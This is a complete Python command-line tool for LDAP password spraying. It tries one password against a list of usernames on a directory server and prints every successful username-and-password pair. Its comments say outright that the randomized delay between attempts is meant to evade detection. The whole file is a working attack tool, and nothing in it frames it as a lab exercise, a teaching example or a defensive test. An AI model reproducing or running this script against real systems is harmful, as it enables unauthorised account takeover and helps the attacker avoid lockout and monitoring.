import random
import time
import argparse
from ldap3 import Server, Connection, ALL, SUBTREE, NTLM, ALL_ATTRIBUTES

def ldap_password_spray(ldap_server: str, base_dn: str, username_list: str, password: str, delay: float = 2.0):
    """
    Performs LDAP password spraying by testing a single password against multiple usernames.

    Usage: python ldap_spray.py ldap://192.168.1.1 "DC=example,DC=com" users.txt "Winter2024!"

    Args:
        ldap_server (str): LDAP server address (e.g., ldap://192.168.1.1).
        base_dn (str): Base distinguished name to search from.
        username_list (str): Path to the file containing usernames.
        password (str): Password to test.
        delay (float): Delay (in seconds) between attempts to avoid detection.
    """
    try:
        # Read the list of usernames
        with open(username_list, "r", encoding="utf-8") as file:
            usernames = [line.strip() for line in file if line.strip()]

        if not usernames:
            print("❌ No usernames found in file!")
            return

        # Initialize LDAP server
        server = Server(ldap_server, get_info=ALL)
        print(f"🔍 Attempting password spraying on {len(usernames)} accounts...")

        for username in usernames:
            try:
                # Attempt authentication with the same password
                conn = Connection(server, user=username, password=password, auto_bind=True)
                
                # If bind is successful
                print(f"[✅] SUCCESS: {username} : {password}")

                # Unbind the connection
                conn.unbind()
            except Exception as e:
                print(f"[❌] FAILED: {username}")

            # Randomized delay to evade detection
            sleep_time = delay + random.uniform(0.5, 1.5)
            time.sleep(sleep_time)

    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LDAP Password Spraying Script")
    parser.add_argument("ldap_server", help="LDAP server (e.g., ldap://192.168.1.1)")
    parser.add_argument("base_dn", help="Base DN (e.g., DC=example,DC=com)")
    parser.add_argument("username_list", help="File containing usernames (one per line)")
    parser.add_argument("password", help="Password to test")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay (seconds) between attempts (default: 2s)")

    args = parser.parse_args()
    ldap_password_spray(args.ldap_server, args.base_dn, args.username_list, args.password, args.delay)
